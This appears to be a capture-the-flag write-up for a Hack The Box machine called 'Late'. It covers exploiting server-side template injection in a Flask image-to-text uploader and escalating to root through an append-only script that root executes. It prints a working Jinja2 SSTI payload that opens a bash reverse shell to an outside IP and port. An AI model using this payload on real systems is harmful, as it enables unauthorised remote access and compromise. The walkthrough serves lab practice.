## Info

### Credential

| User    | Password | Service | Note |
| ------- | -------- | ------- | ---- |
| svc_acc |          |         |      |

### System

- domain: `late.htb`

## Path

### User

1. `images.late.htb` can upload image. And the title of the webpage says "with Flask", so I guess SSTI might be used.
2. The upload image will be converted into text, then use `render_template_string()` to process the text. So we can do SSTI to get shell. Since the OCR isn't so accurate, keep the backgroup clean and use a clear font help a lot.

```text
{{ cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.17.233/9000 0>&1"').read() }}
```

### Root

1. The machine is running ESMTP using `sendmail`.

```bash
svc_acc@late:/$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN

svc_acc@late:/$ curl 127.0.0.1:25
220 localhost.localdomain ESMTP Sendmail 8.15.2/8.15.2/Debian-10; Fri, 29 Jul 2022 07:05:41 GMT; (No UCE/UBE) logging access from: localhost.localdomain(OK)-localhost.localdomain [127.0.0.1]
421 4.7.0 localhost.localdomain Rejecting open proxy localhost.localdomain [127.0.0.1]

svc_acc@late:/tmp/.dont-look$ ls /var/backups/
-rw-r--r--  1 root smmsp    65205 Jan 14  2022 sendmail.cf.bak
-rw-r--r--  1 root smmsp     4209 Jan 14  2022 sendmail.mc.bak
-rw-------  1 root shadow    1310 Apr  7 13:22 shadow.bak
-rw-r--r--  1 root smmsp    44599 Jan 14  2022 submit.cf.bak
-rw-r--r--  1 root smmsp     2375 Jan 14  2022 submit.mc.bak
```

2. We have write permission to `/usr/local/sbin/ssh-alert.sh`, but when using `vim` to edit it, it failed. By using `lsattr`, we can see that we can only append to it.

```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
---a----------e----- /usr/local/sbin/ssh-alert.sh
```

3. By monitoring the processes with `pspy64`, we saw that root will excute `ssh-alert.sh`. Thus, we can get shell.
